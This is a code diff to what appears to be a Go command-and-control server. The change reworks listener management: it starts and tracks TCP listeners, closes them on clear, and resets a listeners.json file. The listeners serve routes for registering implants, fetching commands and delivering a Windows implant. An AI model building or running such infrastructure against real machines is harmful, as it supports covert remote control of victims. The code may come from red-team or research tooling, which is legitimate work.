@@ -5,9 +5,12 @@ import (
 	"fmt"
 	"io/ioutil"
 	"log"
+	"net"
 	"net/http"
 	"os"
 )
+
+var activeListeners = make(map[string]net.Listener)
 
 func entryExists(newListener Listener, existingListeners []Listener) bool {
 	for _, listener := range existingListeners {
@@ -19,7 +22,6 @@ func entryExists(newListener Listener, existingListeners []Listener) bool {
 }
 
 func createListener(w http.ResponseWriter, r *http.Request) {
-	// Decode JSON request body into Listener struct
 	decoder := json.NewDecoder(r.Body)
 	defer r.Body.Close()
 
@@ -63,15 +65,21 @@ func createListener(w http.ResponseWriter, r *http.Request) {
 	if err := ioutil.WriteFile(filePath, updatedContent, 0644); err != nil {
 		log.Println("Error while writing to file:", err)
 	}
-
-	fmt.Println("Generated listeners.json")
-
-	// First server config
-	serverIP := newListener.IP
 	serverPort := newListener.Port
-	var socket = serverIP + ":" + serverPort
+	listenerAddress := ":" + serverPort
 
-	// Mux for server1
+	ln, err := net.Listen("tcp", listenerAddress)
+	if err != nil {
+		log.Printf("Failed to start listener on %s: %v\n", listenerAddress, err)
+		http.Error(w, "Failed to start listener", http.StatusInternalServerError)
+		return
+	}
+
+	// Safely add the listener to the global map
+	mu.Lock()
+	activeListeners[listenerAddress] = ln
+	mu.Unlock()
+
 	mux := http.NewServeMux()
 	mux.HandleFunc("/registerNewImplant", registerNewImplant)
 	mux.HandleFunc("/getCommand", getCommand)
@@ -79,13 +87,14 @@ func createListener(w http.ResponseWriter, r *http.Request) {
 	mux.HandleFunc("/agents/windows/cs", windowsImplant)
 
 	go func() {
-		fmt.Println("Implant Server: " + socket)
-		err := http.ListenAndServe(socket, mux)
-		if err != nil {
-			log.Fatal("ListenAndServe for socket1: ", err)
+		defer ln.Close()
+		fmt.Printf("Starting server at %s\n", listenerAddress)
+		if err := http.Serve(ln, mux); err != nil {
+			log.Printf("Failed to serve on %s: %v\n", listenerAddress, err)
 		}
 	}()
 
+	alert("New Listener created")
 }
 
 func getListeners(w http.ResponseWriter, r *http.Request) {
@@ -120,21 +129,38 @@ func getListeners(w http.ResponseWriter, r *http.Request) {
 
 func clearListeners(w http.ResponseWriter, r *http.Request) {
 	filePath := "ListenerEntries\\listeners.json"
+	empty_listeners := "{\"Listeners\":[]}"
 
-	// Create an empty ListenerWrapper
-	emptyWrapper := ListenerWrapper{
-		Listeners: []Listener{},
+	// Close all active listeners
+	mu.Lock()
+	for address, listener := range activeListeners {
+		if err := listener.Close(); err != nil {
+			log.Printf("Failed to close listener on %s: %v\n", address, err)
+			// Decide whether to continue or return based on your error handling policy
+		}
+		delete(activeListeners, address)
 	}
+	mu.Unlock()
 
-	// Marshal it to JSON
-	emptyContent, err := json.Marshal(emptyWrapper)
-	if err != nil {
-		log.Println("Error while marshaling:", err)
+	// Remove the file if it exists
+	if err := os.Remove(filePath); err != nil && !os.IsNotExist(err) {
+		log.Println("Error while removing file:", err)
 		return
 	}
 
-	// Write the empty JSON content back to the file
-	if err := ioutil.WriteFile(filePath, emptyContent, 0644); err != nil {
+	// Create the file again
+	file, err := os.Create(filePath)
+	if err != nil {
+		log.Println("Error while creating file:", err)
+		return
+	}
+	defer file.Close()
+
+	// Write the empty_listeners content back to the file
+	if _, err := file.WriteString(empty_listeners); err != nil {
 		log.Println("Error while writing to file:", err)
 	}
+
+	fmt.Println("Listeners have been cleared.")
+	alert("Listeners have been cleared.")
 }
